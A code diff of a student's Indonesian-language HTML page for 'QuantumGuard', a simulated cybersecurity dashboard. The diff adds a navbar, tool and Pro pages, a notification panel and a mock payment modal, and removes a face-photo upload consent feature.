@@ -8,6 +8,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <style>
         /* CSS Umum */
         :root {
@@ -185,7 +186,7 @@
             opacity: 1;
         }
 
-        /* --- Halaman Dasbor --- */
+        /* --- Halaman Dasbor & Konten --- */
         .cyber-security-page {
             display: none;
             position: relative;
@@ -193,11 +194,9 @@
             min-height: 100vh;
             background-color: transparent;
             color: var(--text-color);
-            padding: 2rem;
             box-sizing: border-box;
             opacity: 0;
             transition: opacity 1s ease-in-out;
-            overflow-y: auto;
             z-index: 10;
         }
 
@@ -218,6 +217,17 @@
 
         .hacked-text {
             color: var(--red-color);
+        }
+
+        /* Konten halaman */
+        .page-content {
+            padding: 2rem;
+            display: none;
+            flex-direction: column;
+            gap: 2rem;
+        }
+        .page-content.active {
+            display: flex;
         }
 
         .grid-container {
@@ -287,14 +297,34 @@
         .network-threat-card .output {
             flex-grow: 1;
         }
+        
+        .output .log-entry {
+            margin-bottom: 10px;
+        }
+        
+        .output .log-entry button {
+            padding: 5px 10px;
+            font-size: 0.8rem;
+            text-transform: none;
+            border-radius: 5px;
+            margin-left: 10px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+
+        .output .log-entry button:hover {
+            transform: none;
+            box-shadow: none;
+        }
 
         .card .output span.green { color: var(--green-color); }
         .card .output span.red { color: var(--red-color); }
         .card .output span.yellow { color: var(--yellow-color); }
         .card .output span.blue { color: var(--main-color); }
         .card .output span.gray { color: var(--gray-light); }
-
-        .card.malware-scanner input {
+        
+        .card.malware-scanner input,
+        .card.firewall-manager input,
+        .card.key-management input {
             width: calc(100% - 2rem);
             background-color: #0d1117;
             border: 1px solid var(--border-color);
@@ -305,7 +335,9 @@
             font-family: 'Roboto Mono', monospace;
         }
 
-        .card.malware-scanner button {
+        .card.malware-scanner button,
+        .card.firewall-manager button,
+        .card.key-management button {
             width: 100%;
             margin-top: 1rem;
         }
@@ -328,16 +360,6 @@
         .card.summary-panel .summary-value.warning { color: var(--yellow-color); }
         .card.summary-panel .summary-value.critical { color: var(--red-color); }
 
-        .card.key-management input {
-            width: calc(100% - 2rem);
-            background-color: #0d1117;
-            border: 1px solid var(--border-color);
-            color: var(--text-color);
-            padding: 0.75rem;
-            border-radius: 0.5rem;
-            font-family: 'Roboto Mono', monospace;
-            margin-bottom: 1rem;
-        }
         .card.key-management .key-info {
             font-family: 'Roboto Mono', monospace;
             font-size: 0.8em;
@@ -348,65 +370,8 @@
             border: 1px dashed var(--gray-light);
             margin-top: 1rem;
         }
-
-        /* Bagian Pengguna */
-        #user-section {
-            background-color: #010409;
-            padding: 2rem;
-            border-radius: 1rem;
-            margin-top: 3rem;
-            border: 1px solid var(--border-color);
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        }
-
-        #user-section h2 {
-            font-size: 2rem;
-            color: var(--main-color);
-            margin-bottom: 1.5rem;
-        }
-
-        .user-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
-            gap: 1.5rem;
-            justify-items: center;
-        }
-
-        .user-profile {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 0.5s ease, transform 0.5s ease;
-        }
         
-        .user-profile.show {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .user-profile img {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            border: 3px solid var(--green-color);
-            object-fit: cover;
-            transition: transform 0.3s ease;
-        }
-
-        .user-profile img:hover {
-            transform: scale(1.1);
-        }
-
-        .user-profile span {
-            font-size: 0.8rem;
-            color: #8b949e;
-            margin-top: 0.5rem;
-        }
-        
-        /* --- Modal Persetujuan --- */
+        /* --- Modal Persetujuan & Payment --- */
         .modal {
             display: none;
             position: fixed; 
@@ -457,6 +422,31 @@
         }
         .modal-buttons #reject-button:hover {
             background-color: #d32f2f;
+        }
+        
+        #payment-modal .modal-content h3 {
+            color: var(--main-color);
+        }
+        
+        .loading-animation {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        .loader {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid var(--main-color);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* --- Animasi Sambutan BARU --- */
@@ -550,11 +540,280 @@
                 transform: translate(0);
             }
         }
+        
+        /* Notifikasi */
+        .notification-dropdown {
+            position: relative;
+            cursor: pointer;
+            z-index: 101;
+        }
+        .notification-dropdown .bell-icon {
+            position: relative;
+            color: var(--text-color);
+        }
+        .notification-dropdown .threat-count {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background-color: var(--red-color);
+            color: white;
+            font-size: 0.7rem;
+            font-weight: bold;
+            border-radius: 50%;
+            padding: 2px 6px;
+            border: 1px solid var(--card-bg);
+            display: none;
+        }
+        .notification-dropdown.active .threat-count {
+            animation: pulse-ring 1s infinite;
+        }
+        
+        @keyframes pulse-ring {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
 
+        .notification-panel {
+            display: none;
+            position: absolute;
+            top: 50px;
+            right: 0;
+            width: 320px;
+            max-height: 400px;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 0.5rem;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            padding: 1rem;
+            z-index: 100;
+            flex-direction: column;
+            gap: 10px;
+            text-align: left;
+            overflow-y: auto;
+        }
+        .notification-dropdown.active .notification-panel {
+            display: flex;
+        }
+        .notification-item {
+            padding: 0.75rem;
+            border-radius: 5px;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.9rem;
+            border-left: 3px solid var(--red-color);
+        }
+        .notification-item span {
+            word-break: break-word;
+        }
+        .notification-item.blocked {
+            background-color: rgba(76, 175, 80, 0.1);
+            border-left-color: var(--green-color);
+        }
+        .notification-panel .block-all-btn {
+            width: 100%;
+            padding: 0.5rem;
+            margin-top: 10px;
+            text-transform: none;
+            font-weight: normal;
+        }
+
+        /* Kelas untuk Fitur Berbayar (Pro) */
+        .pro-feature {
+            background-color: #010409;
+            padding: 1.5rem;
+            border-radius: 0.75rem;
+            border: 2px dashed var(--yellow-color);
+            text-align: center;
+        }
+
+        .pro-feature h3 {
+            color: var(--yellow-color);
+            border-bottom-color: var(--yellow-color);
+            justify-content: center;
+        }
+
+        .pro-feature p {
+            font-size: 1rem;
+            color: #8b949e;
+            margin-bottom: 1.5rem;
+        }
+
+        .pro-feature button {
+            background-color: var(--yellow-color);
+            color: var(--bg-color);
+        }
+        .pro-feature button:hover {
+            background-color: #fdd835;
+        }
+        
+        .pro-active {
+            border: 1px solid var(--green-color);
+            box-shadow: 0 0 10px var(--green-color);
+        }
+        .pro-active h3 {
+            color: var(--green-color);
+            border-bottom-color: var(--green-color);
+        }
+        
+        /* Payment Section */
+        .payment-form {
+            display: none;
+            flex-direction: column;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        .payment-form input {
+            background-color: var(--bg-color);
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            padding: 0.75rem;
+            border-radius: 0.5rem;
+            font-family: 'Poppins', sans-serif;
+            font-size: 1rem;
+        }
+        .payment-form button {
+            width: 100%;
+        }
+
+
+        /* --- Navbar --- */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: var(--card-bg);
+            padding: 1rem 2rem;
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--main-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+        .navbar .logo svg {
+            margin-right: 0.5rem;
+        }
+
+        /* Mengatur nav-links agar rata kanan */
+        .navbar .nav-links {
+            display: flex;
+            gap: 1.5rem;
+            margin-left: auto; /* Mendorong semua tautan ke kanan */
+        }
+
+        .navbar .nav-links a {
+            color: var(--text-color);
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+            position: relative;
+        }
+
+        .navbar .nav-links a:hover,
+        .navbar .nav-links a.active {
+            color: var(--main-color);
+        }
+        
+        .navbar .nav-links a.active::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: var(--main-color);
+            animation: underline 0.5s ease-out forwards;
+        }
+        
+        @keyframes underline {
+            from { transform: scaleX(0); }
+            to { transform: scaleX(1); }
+        }
+
+        .navbar .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            margin-left: 1.5rem; /* Memberi jarak dari nav-links */
+        }
+        .navbar .user-info img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 2px solid var(--green-color);
+            object-fit: cover;
+            cursor: pointer;
+        }
+
+        /* Hambuger Menu for Mobile */
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+        }
+        .hamburger .bar {
+            width: 25px;
+            height: 3px;
+            background-color: var(--text-color);
+            transition: all 0.3s ease;
+        }
+        
+        /* About Page */
+        #about-page {
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        #about-page h2 {
+            font-size: 2.5rem;
+            color: var(--main-color);
+        }
+        #about-page p {
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+        #about-page .tech-icons {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-top: 2rem;
+            flex-wrap: wrap;
+        }
+        #about-page .tech-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.9rem;
+            color: var(--gray-light);
+        }
+        #about-page .tech-icon svg {
+            width: 60px;
+            height: 60px;
+            color: var(--text-color);
+            margin-bottom: 0.5rem;
+            transition: transform 0.3s, color 0.3s;
+        }
+        #about-page .tech-icon svg:hover {
+            transform: scale(1.1);
+            color: var(--main-color);
+        }
+        
         /* --- Media Queries untuk Responsif --- */
         @media (max-width: 768px) {
             body {
-                padding: 1rem;
+                padding: 0;
             }
 
             .container {
@@ -566,7 +825,7 @@
             }
 
             .cyber-security-page {
-                padding: 1rem;
+                padding: 0;
             }
 
             header h1 {
@@ -585,21 +844,73 @@
                 font-size: 1.25rem;
             }
 
-            .user-grid {
-                grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
-            }
-            
-            #user-section h2 {
+            /* Penyesuaian khusus untuk animasi sambutan di perangkat kecil */
+            #welcome-splash .welcome-text-container h2 {
                 font-size: 1.5rem;
             }
 
-            /* Penyesuaian khusus untuk animasi sambutan di perangkat kecil */
-            #welcome-splash .welcome-text-container h2 {
-                font-size: 1.5rem; /* Ukuran font lebih kecil */
+            #welcome-splash .welcome-text-container h3 {
+                font-size: 1rem;
+            }
+            
+            #notification-box {
+                top: 10px;
+                right: 10px;
+                width: calc(100% - 20px);
             }
 
-            #welcome-splash .welcome-text-container h3 {
-                font-size: 1rem; /* Ukuran font lebih kecil */
+            /* Navbar Responsif */
+            .navbar {
+                flex-wrap: wrap;
+                padding: 1rem;
+            }
+            
+            .navbar .nav-links {
+                display: none;
+                flex-direction: column;
+                width: 100%;
+                background-color: var(--card-bg);
+                padding: 1rem 0;
+                gap: 1rem;
+                text-align: left;
+                margin-top: 1rem;
+            }
+            .navbar .nav-links.active {
+                display: flex;
+            }
+            .navbar .nav-links a {
+                padding-left: 1rem;
+            }
+            
+            .navbar .user-info {
+                display: none;
+                margin-left: 0;
+            }
+            .navbar .user-info.active {
+                display: flex;
+                width: 100%;
+                justify-content: flex-end;
+            }
+            .hamburger {
+                display: flex;
+            }
+
+            .navbar .main-menu {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                width: 100%;
+            }
+
+            .notification-dropdown {
+                position: static;
+            }
+            .notification-panel {
+                top: 100%;
+                left: 0;
+                right: auto;
+                width: 100%;
+                transform: none;
             }
         }
     </style>
@@ -620,17 +931,6 @@
         </div>
     </div>
 
-    <div id="consent-modal" class="modal">
-        <div class="modal-content">
-            <h3>Pemberitahuan Privasi</h3>
-            <p>Pemindaian wajah Anda berhasil! Apakah Anda bersedia foto Anda diunggah dan ditampilkan di dasbor publik?</p>
-            <div class="modal-buttons">
-                <button id="agree-button">Setuju</button>
-                <button id="reject-button">Tolak</button>
-            </div>
-        </div>
-    </div>
-
     <div id="welcome-splash">
         <div class="welcome-text-container">
             <h2>Selamat Datang di Website <span class="glitch-text">Cyber Security</span></h2>
@@ -638,87 +938,198 @@
         </div>
     </div>
 
+    <div id="payment-modal" class="modal">
+        <div class="modal-content">
+            <h3 id="payment-title">Aktifkan QuantumGuard Pro</h3>
+            <p id="payment-text">Untuk mengakses fitur ini, Anda perlu berlangganan. Biaya: Rp 50.000 / Bulan.</p>
+            <div class="payment-form" id="payment-form">
+                <input type="text" id="credit-card-input" placeholder="Nomor Kartu Kredit (simulasi)">
+                <input type="text" id="expiry-input" placeholder="MM/YY">
+                <input type="text" id="cvv-input" placeholder="CVV">
+                <button id="pay-button">Bayar Sekarang</button>
+            </div>
+            <div class="loading-animation" id="loading-animation">
+                <div class="loader"></div>
+                <p>Memproses pembayaran...</p>
+            </div>
+        </div>
+    </div>
+    
     <div class="cyber-security-page" id="cyber-security-page">
-        <header>
-            <h1><span class="hacked-text">_</span> QuantumGuard <span class="hacked-text">_</span></h1>
-            <p>Dashboard Keamanan Siber | Akses Otentikasi Terverifikasi.</p>
-        </header>
-        <div class="grid-container">
-            <div class="card network-threat-card">
-                <h3>
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield-check"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/><path d="m9 12 2 2 4-4"/></svg>
-                    Jaringan & Ancaman
-                </h3>
-                <canvas id="network-traffic-chart"></canvas>
-                <div class="output" id="threat-log"></div>
-            </div>
-
-            <div class="card summary-panel">
-                <h3>
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-monitor"><rect width="20" height="14" x="2" y="3" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg>
-                    Status Sistem
-                </h3>
-                <div class="summary-item">
-                    <span>Server Utama</span>
-                    <span id="server-status" class="summary-value ok">Online</span>
-                </div>
-                <div class="summary-item">
-                    <span>Ping Latency</span>
-                    <span id="ping-latency" class="summary-value ok">25ms</span>
-                </div>
-                <div class="summary-item">
-                    <span>Ancaman Diblokir</span>
-                    <span id="blocked-count" class="summary-value ok">0</span>
-                </div>
-                <div class="summary-item">
-                    <span>Status Layanan</span>
-                    <span id="service-status" class="summary-value ok">Stabil</span>
+        <nav class="navbar">
+            <a href="#" class="logo" onclick="showPage('dashboard')">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-network"><rect x="16" y="16" width="6" height="6" rx="1"/><rect x="2" y="16" width="6" height="6" rx="1"/><path d="M16 2v6h6"/><path d="M2 2v6h6"/><path d="M12 12V6"/><path d="M6 16v-6a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v6"/></svg>
+                QuantumGuard
+            </a>
+            <div class="nav-links" id="nav-links">
+                <a href="#" class="nav-link active" data-page="dashboard" onclick="showPage('dashboard')">Dashboard</a>
+                <a href="#" class="nav-link" data-page="tools" onclick="showPage('tools')">Tools</a>
+                <a href="#" class="nav-link" data-page="pro" onclick="showPage('pro')">Pro</a>
+                <a href="#" class="nav-link" data-page="about" onclick="showPage('about')">About</a>
+                <div class="notification-dropdown" id="notification-dropdown">
+                    <a href="#" class="nav-link bell-icon" onclick="toggleNotifPanel(event)">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bell"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg>
+                        <span class="threat-count" id="threat-count">0</span>
+                    </a>
+                    <div class="notification-panel" id="notification-panel">
+                        <div id="notif-list"></div>
+                        <button id="block-all-btn" class="block-all-btn" style="display: none;">Block All Threats</button>
+                    </div>
                 </div>
             </div>
-
-            <div class="card malware-scanner">
-                <h3>
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-scan"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/></svg>
-                    Analisis File
-                </h3>
-                <input type="text" id="file-input" placeholder="Masukkan nama file (misal: doc_finance.exe)">
-                <button id="scan-file-button">Scan File</button>
-                <div class="output" id="malware-log"></div>
+            <div class="user-info" id="user-info-bar">
+                <img id="user-avatar" src="https://via.placeholder.com/40/03a9f4/FFFFFF?text=P" alt="User Avatar">
             </div>
+            <div class="hamburger" id="hamburger">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+        </nav>
 
-            <div class="card key-management">
-                <h3>
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-key-round"><path d="M2 18v3l1.5-1.5L6 22v-3"/><path d="M14 15.5 12 13l1.5-1.5L15.5 14zm-2-2L10 11l1.5-1.5L12 13z"/><circle cx="12" cy="12" r="7"/><path d="M12 12v4M12 12h4"/></svg>
-                    Manajemen Kunci
-                </h3>
-                <button id="generate-key-button">Generate Kunci Baru</button>
-                <div class="key-info" id="key-output">
-                    Status: <span class="yellow">Belum Ada Kunci</span>
+        <div id="dashboard-page" class="page-content active">
+            <header>
+                <h1><span class="hacked-text">_</span> Dashboard Utama <span class="hacked-text">_</span></h1>
+                <p>Status Keamanan Sistem & Aktivitas Real-time.</p>
+            </header>
+            <div class="grid-container">
+                <div class="card network-threat-card">
+                    <h3>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield-check"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/><path d="m9 12 2 2 4-4"/></svg>
+                        Jaringan & Ancaman
+                    </h3>
+                    <canvas id="network-traffic-chart"></canvas>
+                    <div class="output" id="threat-log"></div>
                 </div>
-            </div>
 
-            <div class="card">
-                <h3>
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clipboard-list"><rect width="8" height="4" x="8" y="2" rx="1" ry="1"/><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><path d="M12 11h4"/><path d="M12 16h4"/><path d="M8 11h.01"/><path d="M8 16h.01"/></svg>
-                    Log Sistem
-                </h3>
-                <div class="output" id="system-log"></div>
-            </div>
+                <div class="card summary-panel">
+                    <h3>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-monitor"><rect width="20" height="14" x="2" y="3" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/></svg>
+                        Status Sistem
+                    </h3>
+                    <div class="summary-item">
+                        <span>Server Utama</span>
+                        <span id="server-status" class="summary-value ok">Online</span>
+                    </div>
+                    <div class="summary-item">
+                        <span>Ping Latency</span>
+                        <span id="ping-latency" class="summary-value ok">25ms</span>
+                    </div>
+                    <div class="summary-item">
+                        <span>Ancaman Diblokir</span>
+                        <span id="blocked-count" class="summary-value ok">0</span>
+                    </div>
+                    <div class="summary-item">
+                        <span>Status Layanan</span>
+                        <span id="service-status" class="summary-value ok">Stabil</span>
+                    </div>
+                </div>
 
-            <div id="user-section">
-                <h2>Pengguna Terautentikasi</h2>
-                <div class="user-grid" id="user-grid">
+                <div class="card">
+                    <h3>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clipboard-list"><rect width="8" height="4" x="8" y="2" rx="1" ry="1"/><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><path d="M12 11h4"/><path d="M12 16h4"/><path d="M8 11h.01"/><path d="M8 16h.01"/></svg>
+                        Log Sistem
+                    </h3>
+                    <div class="output" id="system-log"></div>
                 </div>
             </div>
         </div>
+
+        <div id="tools-page" class="page-content">
+            <header>
+                <h1><span class="hacked-text">_</span> Cyber Tools <span class="hacked-text">_</span></h1>
+                <p>Alat-alat penting untuk menjaga keamanan.</p>
+            </header>
+            <div class="grid-container">
+                <div class="card malware-scanner">
+                    <h3>
+                        <svg xmlns="http://www.w3.org/2400/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-scan"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/></svg>
+                        Analisis File
+                    </h3>
+                    <input type="text" id="file-input" placeholder="Masukkan nama file (misal: doc_finance.exe)">
+                    <button id="scan-file-button">Scan File</button>
+                    <div class="output" id="malware-log"></div>
+                </div>
+    
+                <div class="card key-management">
+                    <h3>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-key-round"><path d="M2 18v3l1.5-1.5L6 22v-3"/><path d="M14 15.5 12 13l1.5-1.5L15.5 14zm-2-2L10 11l1.5-1.5L12 13z"/><circle cx="12" cy="12" r="7"/><path d="M12 12v4M12 12h4"/></svg>
+                        Manajemen Kunci
+                    </h3>
+                    <button id="generate-key-button">Generate Kunci Baru</button>
+                    <div class="key-info" id="key-output">
+                        Status: <span class="yellow">Belum Ada Kunci</span>
+                    </div>
+                </div>
+    
+                <div class="card firewall-manager">
+                    <h3>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-lock"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        Firewall Manager
+                    </h3>
+                    <input type="text" id="firewall-input" placeholder="Blokir IP/port: 192.168.1.1:80">
+                    <button id="firewall-add-button">Tambah Aturan Blokir</button>
+                    <div class="output" id="firewall-log"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="pro-page" class="page-content">
+            <header>
+                <h1><span class="hacked-text">_</span> QuantumGuard Pro <span class="hacked-text">_</span></h1>
+                <p>Akses fitur eksklusif dan laporan mendalam.</p>
+            </header>
+            <div class="grid-container">
+                <div class="card pro-feature" id="report-card">
+                    <h3>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-file-text"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L15 2z"/><path d="M14 2v6h6"/><path d="M10 10h4"/><path d="M10 14h4"/><path d="M10 18h4"/></svg>
+                        Laporan Keamanan (Pro)
+                    </h3>
+                    <p id="pro-status-text">Layanan QuantumGuard Pro belum aktif. Silakan sewa untuk mendapatkan laporan mingguan dan bulanan.</p>
+                    <button id="activate-pro-button">Aktifkan QuantumGuard Pro</button>
+                    <button id="generate-report-button" style="display: none;">Buat Laporan PDF</button>
+                </div>
+            </div>
+        </div>
+        
+        <div id="about-page" class="page-content">
+            <header>
+                <h1><span class="hacked-text">_</span> Tentang QuantumGuard <span class="hacked-text">_</span></h1>
+                <p>Dibuat oleh Andhika 11 RPL 2.</p>
+            </header>
+            <div class="about-content">
+                <h2>Proyek Keamanan Siber</h2>
+                <p>QuantumGuard adalah proyek simulasi dasbor keamanan siber yang dirancang untuk menunjukkan fungsionalitas dan antarmuka profesional. Proyek ini menggabungkan berbagai teknologi untuk menciptakan pengalaman interaktif, mulai dari otentikasi wajah hingga analisis ancaman dan manajemen firewall.</p>
+                <div class="tech-icons">
+                    <div class="tech-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-code"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+                        <span>HTML & CSS</span>
+                    </div>
+                    <div class="tech-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-script"><path d="M16 11.3c.6.6 1.1 1.5 1 2.5a2.5 2.5 0 0 1-2.5 2.5c-1.1.1-2.1-.4-2.7-1.1L7 10.7c-.6-.6-1.5-1.1-2.5-1a2.5 2.5 0 0 0-2.5 2.5c-.1 1.1.4 2.1 1.1 2.7L7 16.7"/><path d="m14 7 3-3 4-4"/><path d="m10 10 2.5 2.5"/></svg>
+                        <span>JavaScript</span>
+                    </div>
+                    <div class="tech-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-chart-line"><path d="M3 15v4a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-4"/><polyline points="18 12 12 6 6 12"/></svg>
+                        <span>Chart.js</span>
+                    </div>
+                    <div class="tech-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-file-text"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/></svg>
+                        <span>jsPDF</span>
+                    </div>
+                    <div class="tech-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-cloud"><path d="M4 14.899A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 2.5 8.242"/><path d="M12 2v6"/><path d="m20 2v6"/><path d="m10 20h.01"/><path d="m14 20h.01"/><path d="m12 16h.01"/></svg>
+                        <span>Cloudinary</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
     </div>
 
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script>
-        const CLOUDINARY_CLOUD_NAME = 'your_cloud_name';
-        const UPLOAD_PRESET = 'your_unsigned_upload_preset';
-        const CLOUDINARY_UPLOAD_URL = `https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`;
-        const DEFAULT_AVATAR = "https://via.placeholder.com/80/03a9f4/FFFFFF?text=USER";
+        const { jsPDF } = window.jspdf;
 
         particlesJS('particles-js', {
             "particles": {
@@ -745,11 +1156,11 @@
         const scanButton = document.getElementById('scan-button');
         const scanLine = document.getElementById('scan-line');
         const videoBox = document.querySelector('.video-box');
-        const userGrid = document.getElementById('user-grid');
-        
+
         const threatLog = document.getElementById('threat-log');
         const systemLog = document.getElementById('system-log');
         const malwareLog = document.getElementById('malware-log');
+        const firewallLog = document.getElementById('firewall-log');
         const networkTrafficChart = document.getElementById('network-traffic-chart').getContext('2d');
         const fileInput = document.getElementById('file-input');
         const scanFileButton = document.getElementById('scan-file-button');
@@ -761,24 +1172,47 @@
         const blockedCount = document.getElementById('blocked-count');
         const serviceStatus = document.getElementById('service-status');
 
-        const consentModal = document.getElementById('consent-modal');
-        const agreeButton = document.getElementById('agree-button');
-        const rejectButton = document.getElementById('reject-button');
-
         const welcomeSplash = document.getElementById('welcome-splash');
+
